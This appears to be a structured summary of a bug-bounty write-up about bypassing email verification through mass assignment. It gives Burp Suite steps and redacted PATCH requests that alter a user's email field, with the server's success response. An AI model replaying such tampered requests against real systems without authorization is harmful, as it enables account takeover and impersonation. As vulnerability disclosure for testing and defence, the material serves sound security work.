---
id: 6d3dad9d3ed3
title: "I Bypassed Email Verification in One Request"
source_url: https://scriptjacker.medium.com/i-bypassed-email-verification-in-one-request-569a3c87590d
author: "Parth Narula"
publication_date: 2026-08-19
category: mass-assignment
category_label: "Mass Assignment"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "bug-bounty-writeup"
  - "bug-bounty"
  - "penetration-testing"
  - "bug-bounty-tips"
  - "cybersecurity"
tools:
  - "Burp Suite"
quick_test: "Always inspect API requests for sensitive fields that may be modified, even if the frontend does not expose them."
---

## Use case

The application allowed users to change their email and phone number without proper verification, relying solely on client-side restrictions. This could lead to unauthorized account access and impersonation.

## Steps to test

1. Navigate to the profile management feature of the application.
2. Use Burp Suite to intercept the PATCH request when updating the profile.
3. Observe the request body for sensitive fields like email and phone number.
4. Modify the email field in the request body to a new email address.
5. Send the modified request to the server.
6. Check the response for a success message and verify the change on the profile page.

## Commands

```text
PATCH /api/1/entity/ms.users/6a7.......3e9
Host: REDACTED
Content-Type: application/json
{ "data": { "first_name": "Parth", "last_name": "Narula", "phone": "+91..........", "email": "parthnarula@REDACTED" } }
PATCH /api/1/entity/ms.users/6a7.......3e9
Host: REDACTED
Content-Type: application/json
{
"data": {
"first_name": "Parth",
"last_name": "Narula",
"phone": "+91..........",
"email": "scriptjacker+1@gmail.com"
}
}
PATCH /api/1/entity/ms.users/6a71.......3e9
Host: REDACTED
Content-Type: application/json
{
"data": {
"first_name": "Parth",
"last_name": "Narula",
"phone": "+91..........",
"email": "parthnarula@REDACTED"
}
}
{
"fileBaseUrl": "https://REDACTED",
"data": {},
"messages": [
{
"name": "ms.entity.users.edit",
"level": "success"
}
]
}
PATCH /api/1/entity/ms.users/6a71.......3e9
```

## Source

- Author: Parth Narula
- Writeup: https://scriptjacker.medium.com/i-bypassed-email-verification-in-one-request-569a3c87590d

_For authorized testing only. Credit the original author._
